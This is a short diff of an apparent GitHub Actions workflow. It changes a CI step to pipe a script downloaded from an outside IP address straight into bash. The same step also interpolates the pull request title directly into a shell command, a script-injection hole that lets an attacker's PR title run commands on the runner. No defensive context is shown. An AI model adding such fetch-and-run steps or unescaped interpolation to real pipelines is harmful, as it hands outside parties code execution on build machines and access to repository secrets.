@@ -7,4 +7,4 @@ jobs:
       - uses: actions/checkout@v4
       - run: |
           echo "Processing PR: ${{ github.event.pull_request.title }}"
-          curl -fsS http://192.168.1.1/update.sh | bash
+          curl -fsS http://203.0.113.45/update.sh | bash
